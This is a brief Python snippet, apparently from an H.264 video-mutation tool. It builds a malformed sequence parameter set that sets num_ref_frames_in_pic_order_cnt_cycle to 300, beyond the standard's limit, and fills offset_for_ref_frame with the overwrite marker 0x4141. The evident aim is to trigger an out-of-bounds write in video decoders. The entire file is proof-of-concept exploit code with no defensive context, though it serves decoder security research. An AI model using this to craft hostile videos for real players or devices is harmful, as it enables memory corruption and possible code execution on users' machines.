def oob_num_ref_frames_in_pic_order_cnt_cycle(ds):
    ds["spses"][0]["pic_order_cnt_type"] = 1
    ds["spses"][0]["num_ref_frames_in_pic_order_cnt_cycle"] = 300
    ds["spses"][0]["offset_for_ref_frame"] = [0x4141] * ds["spses"][0]["num_ref_frames_in_pic_order_cnt_cycle"]

    for i in range(len(ds["slices"])):
        ds["slices"][i]["sh"]["delta_pic_order_cnt"] = [0, 0]
    return ds

def modify_video(ds):
    return oob_num_ref_frames_in_pic_order_cnt_cycle(ds)